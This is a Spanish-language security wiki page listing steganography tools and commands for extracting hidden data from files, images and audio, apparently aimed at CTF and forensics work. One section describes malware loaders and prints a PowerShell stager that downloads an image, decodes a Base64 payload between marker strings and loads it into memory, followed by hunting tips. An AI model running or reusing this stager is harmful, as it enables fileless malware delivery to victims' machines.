# Trucos de Stego

{{#include ../banners/hacktricks-training.md}}

## **Extracción de datos de archivos**

### **Binwalk**

Una herramienta para buscar en archivos binarios ficheros y datos ocultos incrustados. Se instala vía `apt` y su código fuente está disponible en [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Recupera archivos basándose en sus encabezados y pies, útil para imágenes png. Se instala vía `apt` y su código fuente está en [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Ayuda a ver los metadatos de archivos, disponible [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Similar a exiftool, para la visualización de metadatos. Instalable vía `apt`, código fuente en [GitHub](https://github.com/Exiv2/exiv2), y tiene un [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Identifica el tipo de archivo con el que estás tratando.

### **Strings**

Extrae cadenas legibles de archivos, usando varias configuraciones de codificación para filtrar la salida.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparación (cmp)**

Útil para comparar un archivo modificado con su versión original encontrada en línea.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Extracción de datos ocultos en texto**

### **Datos ocultos en espacios**

Caracteres invisibles en espacios aparentemente vacíos pueden ocultar información. Para extraer estos datos, visita [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Extracción de datos de imágenes**

### **Identificando detalles de imágenes con GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) sirve para determinar los tipos de archivo de imagen e identificar posibles corrupciones. Ejecuta el siguiente comando para inspeccionar una imagen:
```bash
./magick identify -verbose stego.jpg
```
Para intentar reparar una imagen dañada, agregar un comentario de metadatos podría ayudar:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide para la ocultación de datos**

Steghide facilita ocultar datos dentro de `JPEG, BMP, WAV, and AU` files, siendo capaz de incrustar y extraer datos cifrados. La instalación es sencilla usando `apt`, y su código fuente está disponible en GitHub: [https://github.com/StefanoDeVuono/steghide](https://github.com/StefanoDeVuono/steghide).

**Comandos:**

- `steghide info file` indica si un archivo contiene datos ocultos.
- `steghide extract -sf file [--passphrase password]` extrae los datos ocultos, contraseña opcional.

Para extracción en la web, visita [this website](https://futureboy.us/stegano/decinput.html).

**Ataque de fuerza bruta con Stegcracker:**

- Para intentar romper la contraseña de Steghide, usa [stegcracker](https://github.com/Paradoxis/StegCracker.git) de la siguiente manera:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg para archivos PNG y BMP**

zsteg se especializa en descubrir datos ocultos en archivos PNG y BMP. La instalación se realiza vía `gem install zsteg`, con su código fuente en GitHub: https://github.com/zed-0xff/zsteg

**Commands:**

- `zsteg -a file` aplica todos los métodos de detección en un archivo.
- `zsteg -E file` especifica un payload para la extracción de datos.

### **StegoVeritas y Stegsolve**

**stegoVeritas** revisa metadatos, realiza transformaciones de imágenes y aplica LSB brute forcing, entre otras funciones. Usa `stegoveritas.py -h` para la lista completa de opciones y `stegoveritas.py stego.jpg` para ejecutar todas las comprobaciones.

**Stegsolve** aplica varios filtros de color para revelar textos o mensajes ocultos dentro de imágenes. Está disponible en https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve

### **FFT para la detección de contenido oculto**

Las técnicas de Transformada Rápida de Fourier (FFT) pueden revelar contenido oculto en imágenes. Recursos útiles incluyen:

- http://bigwww.epfl.ch/demo/ip/demos/FFT/
- https://www.ejectamenta.com/Fourifier-fullscreen/
- https://github.com/0xcomposure/FFTStegPic

### **Stegpy para archivos de audio e imagen**

Stegpy permite incrustar información en archivos de imagen y audio, soportando formatos como PNG, BMP, GIF, WebP y WAV. Está disponible en https://github.com/dhsdshdhk/stegpy

### **Pngcheck para análisis de archivos PNG**

Para analizar archivos PNG o validar su autenticidad, usa:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Herramientas adicionales para el análisis de imágenes**

Para una exploración adicional, considera visitar:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Payloads Base64 delimitados por marcadores ocultos en imágenes (malware delivery)

Los commodity loaders ocultan cada vez más payloads codificados en Base64 como plain text dentro de imágenes válidas (a menudo GIF/PNG). En lugar del LSB a nivel de píxel, el payload está delimitado por cadenas marcadoras únicas de inicio/fin incrustadas en el texto/metadata del archivo. A continuación, un PowerShell stager:

- Descarga la imagen por HTTP(S)
- Localiza las marker strings (ejemplos observados: <<sudo_png>> … <<sudo_odt>>)
- Extrae el texto intermedio y lo decodifica Base64 a bytes
- Carga el ensamblado .NET en memoria e invoca un método de entrada conocido (no se escribe ningún archivo en disco)

Fragmento mínimo de PowerShell para carving/loading
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Notas
- This falls under ATT&CK T1027.003 (steganography). Las cadenas marcadoras varían entre campañas.
- Hunting: escanee imágenes descargadas en busca de delimitadores conocidos; marque `PowerShell` que use `DownloadString` seguido de `FromBase64String`.

Vea también ejemplos de entrega de phishing y el flujo completo de invocación en memoria aquí:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Extracción de datos de audios**

**Audio steganography** ofrece un método único para ocultar información dentro de archivos de audio. Se utilizan diferentes herramientas para incrustar o recuperar contenido oculto.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide es una herramienta versátil diseñada para ocultar datos en archivos JPEG, BMP, WAV y AU. Instrucciones detalladas se proporcionan en la [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Esta herramienta es compatible con varios formatos, incluyendo PNG, BMP, GIF, WebP y WAV. Para más información, consulte [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg es crucial para evaluar la integridad de los archivos de audio, mostrando información detallada y señalando cualquier discrepancia.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg sobresale en ocultar y extraer datos dentro de archivos WAV utilizando la estrategia least significant bit. Está disponible en [GitHub](https://github.com/ragibson/Steganography#WavSteg). Los comandos incluyen:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound permite el cifrado y la detección de información dentro de archivos de audio usando AES-256. Puede descargarse desde [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Una herramienta invaluable para la inspección visual y analítica de archivos de audio; Sonic Visualizer puede revelar elementos ocultos indetectables por otros medios. Visita el [official website](https://www.sonicvisualiser.org/) para más información.

### **DTMF Tones - Dial Tones**

La detección de tonos DTMF en archivos de audio puede lograrse mediante herramientas en línea como [this DTMF detector](https://unframework.github.io/dtmf-detect/) y [DialABC](http://dialabc.com/sound/detect/index.html).

## **Other Techniques**

### **Longitud binaria SQRT - QR Code**

Los datos binarios cuya longitud es un cuadrado perfecto podrían representar un QR code. Usa este fragmento para comprobar:
```python
import math
math.sqrt(2500) #50
```
Para la conversión de binario a imagen, consulta [dcode](https://www.dcode.fr/binary-image). Para leer códigos QR, usa [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Traducción de Braille**

Para traducir Braille, [Branah Braille Translator](https://www.branah.com/braille-translator) es un recurso excelente.

## **Referencias**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
